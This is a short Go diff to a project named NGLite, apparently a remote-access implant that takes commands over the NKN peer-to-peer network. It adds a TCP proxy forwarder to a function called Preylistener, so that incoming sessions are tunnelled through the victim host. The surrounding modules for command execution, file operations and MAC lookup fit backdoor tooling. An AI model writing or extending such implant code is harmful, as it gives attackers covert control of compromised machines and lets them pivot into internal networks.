@@ -11,6 +11,7 @@ import (
 	"NGLite/module/command"
 	"NGLite/module/fileops"
 	"NGLite/module/getmac"
+	"NGLite/module/proxy"
 
 	nkn "github.com/nknorg/nkn-sdk-go"
 )
@@ -48,6 +49,22 @@ func Preylistener(seedid string) {
 		}
 
 		<-Listener.OnConnect.C
+
+		forwarder := proxy.NewTcpForwarder()
+		defer forwarder.Close()
+
+		go func() {
+			for {
+				session, err := Listener.Accept()
+				if err != nil {
+					fmt.Printf("接受 Session 失败: %v\n", err)
+					continue
+				}
+				
+				fmt.Println("收到代理 Session 连接")
+				go forwarder.HandleProxySession(session)
+			}
+		}()
 
 		for {
 			msg := <-Listener.OnMessage.C
